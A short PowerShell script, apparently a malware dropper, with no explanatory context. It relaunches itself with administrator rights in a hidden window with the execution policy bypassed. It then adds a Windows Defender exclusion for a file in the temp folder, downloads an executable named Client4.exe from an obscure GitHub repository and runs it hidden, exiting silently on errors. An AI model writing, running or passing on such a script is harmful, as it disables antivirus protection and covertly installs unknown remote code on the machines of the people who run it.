param([string]$OriginalTemp=$env:TEMP)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp '$env:TEMP'"
    (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe',$elevatedCommand,'','runas',0)
    exit
}

$output = Join-Path $OriginalTemp "cf2.exe"
if (Test-Path $output) { Remove-Item $output -Force }

try {
    Add-MpPreference -ExclusionPath $output
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/Client4.exe' -OutFile $output
    if (Test-Path $output) {
        Start-Process $output -WindowStyle Hidden
    }
}
catch { exit }
